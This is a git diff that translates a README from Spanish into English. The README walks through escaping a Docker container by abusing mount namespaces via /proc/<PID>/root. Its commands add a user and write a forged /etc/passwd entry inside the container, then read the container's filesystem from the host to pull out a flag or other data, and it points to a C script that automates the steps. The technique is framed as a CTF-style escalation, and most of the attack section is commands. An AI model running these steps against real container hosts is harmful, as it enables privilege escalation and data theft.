@@ -1,28 +1,28 @@
 # Abusing mount namespaces through /proc/<PID>/root
 
-En este repositorio vengo a automatizar la tecnica de los espacios de nombres para escapar de un Docker y elevar privilegios/sacar la flag/dumpear data, etcetera. Pueden leer con mas detalle esta tecnica [aqui](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot). Para poder realizar esta tecnica con exito necesitas cumplir los siguientes requisitos.
+In this repository I come to automate the namespace technique to escape from a Docker and elevate privileges/remove the flag/dump data, etcetera. You can read in more detail this technique [here](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot). In order to perform this technique successfully you need to fulfill the following requirements.
 
-- Shell como usuario no privilgiado en el host
-- Shell como root en el Docker.
+- Shell as non-privileged user on host
+- Shell as root on the Docker.
 
-Explotacion:
+Exploit:
 
-**Los siguientes pasos debes correrlos en el Docker como root.**
+**The following steps you must run them in the Docker as root.
 
 ``` shell
-useradd luk4s # Este usuario debe existir en la maquina host.
+useradd luk4s # This user must exist on the host machine.
 usermod -aG luk4s luk4s
-echo "luk4s:x:1000:1000:luk4s:/home/luk4s:/bin/bash" >> /etc/passwd # El contenido lo podemos sacar de la maquina hosts utilizando -> grep luk4s /etc/paswd
+echo "luk4s:x:1000:1000:luk4s:/home/luk4s:/bin/bash" >> /etc/passwd # The content can be taken out of the machine host -> grep luk4s /etc/paswd
 su luk4s
-/bin/sh # Este comando lo ejecutamos cuando ganamos shell como luk4s en el contenedor
+/bin/sh # We run this command when we gain shell as luk4s in the container
 ```
 
-Con esto ya tenemos listo el trabajo en el contenedor.
+With this we are ready to work on the container.
 
-**Los siguientes comandos debes ejecutarlo de la maquina hosts.**
+**The following commands must be executed from the hosts machine.
 
 ``` shell
-ps aux | grep sh # Vas a notar un proceso que corre tu usuario con una sh, este fue el proceso que creaste tu en el contenedor
+ps aux | grep sh # You will notice a process that runs your user with a sh, this was the process you created in the container
 grep -a "flag" /proc/<pid>/root/sda
 ```
 
@@ -32,7 +32,7 @@ PoC:
 
 ## Automation
 
-Programe un script en C el cual automatiza los pasos a seguir en el contenedor, si quieren usar el binario lo compilan utilizando `gcc` y lo suben al Docker.
+Program a C script which automates the steps to follow in the container, if you want to use the binary you compile it using `gcc` and upload it to Docker.
 
 ``` shell
 gcc exploit.c -o exploit
